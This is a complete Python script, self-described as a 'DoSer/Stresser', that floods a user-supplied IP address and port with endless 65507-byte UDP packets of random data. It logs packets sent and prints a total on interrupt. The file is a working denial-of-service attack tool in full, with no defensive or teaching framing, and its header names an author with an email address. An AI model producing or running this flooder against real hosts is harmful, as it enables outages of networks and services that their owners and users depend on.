'''
Programmed by hXR16F
hXR16F.ar@gmail.com

nckill - Network Card KILLer (DoSer/Stresser)
'''

import socket
import random
import sys
import os

def syntax():
    print("Usage: " + os.path.split(sys.argv[0])[1] + " <ip address> <port> [options]")
    print("Options:")
    print("         -s      Disable logging (only summary)")
    print("         -c      Reduce CPU usage")
    exit()

def main(target_ip, target_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(65507)
    sent = 0
    total_bytes = 0
    if not "-c" in sys.argv:
        log_frequency = "0"
    else:
        log_frequency = "000"
    while 1:
        try:
            client.sendto(bytes, (target_ip, target_port))
            sent = sent + 1
            sent_formatted = str(sent)
            total_bytes = total_bytes + 65507 / 1048576
            total_bytes_formatted = round(total_bytes, 1)
            if not "-s" in sys.argv:
                if sent_formatted.endswith(log_frequency):
                    print(f"Packets sent: {sent} [{total_bytes_formatted} MB]")
        except KeyboardInterrupt:
            if not "-s" in sys.argv:
                print("\nSummary:")
            else:
                print("Summary:")
            print(f"  Target: {target_ip}:{target_port}")
            print(f"  Total packets sent: {sent}, total megabytes sent: {total_bytes_formatted} MB.")
            exit()

if __name__ == '__main__':
    if not len(sys.argv) > 1:
        syntax()
    elif sys.argv[1] == "-h":
        syntax()
    elif sys.argv[1] == "--help":
        syntax()
    elif sys.argv[1] == "/?":
        syntax()
    elif sys.argv[1] == "?":
        syntax()
    else:
        main(sys.argv[1], int(sys.argv[2]))